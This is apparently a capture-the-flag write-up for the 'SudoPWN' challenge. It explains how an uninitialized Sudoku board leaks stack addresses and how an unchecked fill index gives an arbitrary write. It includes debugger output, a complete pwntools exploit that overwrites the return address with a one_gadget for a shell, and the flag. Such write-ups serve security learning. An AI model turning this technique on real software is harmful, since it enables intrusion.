# SudoPWN

## Description

Category : pwn<br>
Points : 492<br>
Solves : 2<br>

Check out my Sudoku console game !

## Analysis 
This is a simple sudoku console-game. We can fill/randomize/print/autosolve the board.
We notice that the board is not initialized:
```c
Board board[N][N];
```
so by printing the board we can leak previously used addresses from the stack.
```
$ ./sudopwn
1) Fill board
2) Randomize board
3) Print board
4) Autosolve board
5) Exit

> 3

    1700966438 |   -1643795816 32705 | -1583889672 32764 -1583889616
32764 -1643796720 32705 |     -1646025793 | 32705
-1583889616 32764   |       |     -1643796720
------+-------+------
32705 -1648421113 32705 |     -1583889840 | 32764 -1583889824 32764
-1643795816 32705   |       | -1583889808 32764 -1
      | -1583414576 32764 -1643796720 | 32705
------+-------+------
      |       | 11   -1646061984
32705 -1583889656 32764 | 15774463   1 |   -1419767187 21907
-1646003360 32705   |   -1419767264 21907 | -1419769696 21907 -1583889456
```
We also notice the the fill_board function doesn't check if the indexes are >= 9, so we have an arbitrary write primitive.
```c
void fill_board(Board board[N][N]) {
  int row, col, val;

  row = read_num("Row index: ");
  col = read_num("Column index: ");
  val = read_num("Value: ");

  board[row][col] = val;
}
```
After doing some dynamic analysis with pwndbg, we find that there is a libc address of the string "__vsdo_getcpu"
at index board[3][1]
```
pwndbg> x/41gx $rbp-0x150
0x7fffffffe630: 0x0000000000000000      0x000000006562b026
0x7fffffffe640: 0x00007ffff7ffea98      0x00007fffffffe788
0x7fffffffe650: 0x00007fffffffe7c0      0x00007ffff7ffe710
0x7fffffffe660: 0x0000000000000000      0x00007ffff7dde3bf
0x7fffffffe670: 0x0000000000000000      0x00007fffffffe7c0
0x7fffffffe680: 0x0000000000000000      0x0000000000000000
0x7fffffffe690: 0x0000000000000000      0x00007ffff7ffe710
0x7fffffffe6a0: 0x00007ffff7b95707<---- 0x0000000000000000
0x7fffffffe6b0: 0x00007fffffffe6e0      0x00007fffffffe6f0
0x7fffffffe6c0: 0x00007ffff7ffea98      0x0000000000000000
0x7fffffffe6d0: 0x0000000000000000      0x00007fffffffe700
0x7fffffffe6e0: 0x00000000ffffffff      0x0000000000000000
0x7fffffffe6f0: 0x00007ffff7ffa2d0      0x00007ffff7ffe710
0x7fffffffe700: 0x0000000000000000      0x0000000000000000
0x7fffffffe710: 0x0000000000000000      0x0000000000000000
0x7fffffffe720: 0x000000000000000b      0x00007ffff7dd5660
0x7fffffffe730: 0x00007fffffffe798      0x0000000000f0b2ff
0x7fffffffe740: 0x0000000000000001      0x000055555540126d
0x7fffffffe750: 0x00007ffff7de3b60      0x0000000000000000
0x7fffffffe760: 0x0000555555401220      0x00005555554008a0
0x7fffffffe770: 0x00007fffffffe860
pwndbg> x/s 0x00007ffff7b95707
0x7ffff7b95707: "__vdso_getcpu"
```

## Solution
After leaking the "_vdso_getcpu" libc address, we can calculate the libc base address using the offset, then overwrite the main return address
at index board[9][5] with a one_gadget to get a shell.

## Exploit
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./sudopwn")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.terminal = ['st']

one_gadget_offset = 0x10a41c

def conn():
    if args.LOCAL:
        return process(exe.path)
    else:
        return remote("pwn.ctf.microclub.net", 5004)

def main():
    r = conn()

    log.info('Leaking libc address ...')
    r.sendline('3')
    r.recvuntil('------+-------+------\n')
    numbers = r.recvline().decode("utf-8")
    libc__vdso_getcpu = (int(numbers.split(' ')[0]) << 32) + (int(numbers.split(' ')[1]) & 0xffffffff)
    log.info(f'Libc__vdso_getcpu address : {hex(libc__vdso_getcpu)}')
    libc.address = libc__vdso_getcpu - next(libc.search(b"__vdso_getcpu"))
    log.info(f'Libc base address : {hex(libc.address)}')
    one_gadget = libc.address + one_gadget_offset
    log.info(f'Libc one gadget : {hex(one_gadget)}')
    r.sendline('1\n9\n5')
    r.sendline(str(one_gadget & 0xffffffff))
    r.sendline('5')

    r.interactive()


if __name__ == "__main__":
    main()
```

## Flag
```
shellmates{th3_WH0lE_4ddre$s_sP4c3_Is_4_sUD0kU_b0aRD!!!}
```

[Shellmates's original write-ups](https://github.com/Shellmates/MicroCTF-2021-quals)

